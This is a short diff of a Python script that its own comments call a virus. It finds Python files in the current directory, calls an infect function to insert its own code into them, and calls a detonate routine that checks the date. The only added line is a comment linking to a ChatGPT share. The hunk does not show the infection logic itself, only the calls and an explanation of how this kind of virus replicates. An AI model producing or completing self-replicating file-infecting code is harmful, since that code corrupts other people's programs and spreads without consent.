@@ -59,4 +59,5 @@ files_targeted = locate(os.path.abspath(""))
 infect(files_targeted)
 # Calls the infect function to infect the found files.
 detonate()
+# resources [ChatGPT] (https://chat.openai.com/share/7929cb8a-bd72-44bf-8244-0a0f41d47aa4)
 # Calls the detonate function which checks the date and may print a message. Core Python/coding tools used: Functions (locate, infect, detonate) for organizing code into reusable blocks. The os module for interacting with the file system. The datetime module for getting the current date. Control structures like if statements and for loops for decision making and iteration. File handling (opening, reading, writing, closing files). Type of Malware: This script is a type of malware known as a virus. A virus is a malicious code that, once executed, replicates by modifying other computer programs and inserting its own code. In this case, it targets Python files and inserts itself into them.
